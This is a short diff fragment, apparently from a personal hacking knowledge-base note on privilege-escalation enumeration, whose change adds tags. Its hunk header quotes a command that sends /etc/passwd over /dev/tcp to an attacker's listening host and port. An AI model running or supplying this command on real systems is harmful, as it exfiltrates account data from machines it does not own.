@@ -9,4 +9,4 @@ bash -c "cat /etc/passwd > /dev/tcp/$LHOST/$LPORT"
 - ~/kb/hacking/priv-esc/enumeration-quick-commands.md
 
 Tags:
-    #assorted #command
+    #assorted #command #hacking #privesc #enumeration
